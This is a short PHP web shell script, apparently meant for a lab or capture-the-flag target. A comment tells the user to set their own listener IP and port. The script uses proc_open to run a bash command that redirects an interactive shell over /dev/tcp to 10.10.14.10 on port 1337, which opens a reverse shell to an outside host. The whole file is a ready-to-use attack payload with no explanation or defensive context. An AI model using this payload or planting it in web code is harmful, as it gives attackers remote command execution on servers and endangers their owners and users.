// Change your ip in the cmd function to your specified ip and port for your listener
<?php
$descriptorspec = array(
0 => array('pipe', 'r'), // stdin
1 => array('pipe', 'w'), // stdout
2 => array('pipe', 'a') // stderr
);
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.10/1337 0>&1'";
$process = proc_open($cmd, $descriptorspec, $pipes, null, null);
?>
